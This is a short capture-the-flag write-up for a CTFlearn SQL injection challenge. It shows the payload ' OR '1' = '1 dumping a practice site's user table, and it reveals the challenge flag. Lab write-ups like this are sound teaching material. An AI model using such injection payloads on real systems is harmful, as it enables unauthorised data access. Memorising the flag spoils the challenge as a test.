# Basic injection
[Link to the challenge](https://ctflearn.com/challenge/88)

We need to leak the database using SQL injection in order to get the flag.

## Step 1
I visited the website we are given: https://web.ctflearn.com/web4/
We are asked to submit something.

## Step 2
I tried to inject some SQL: `' OR '1' = '1`.

And got the following output:
```
Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii
```

## Solution
The flag is `CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}`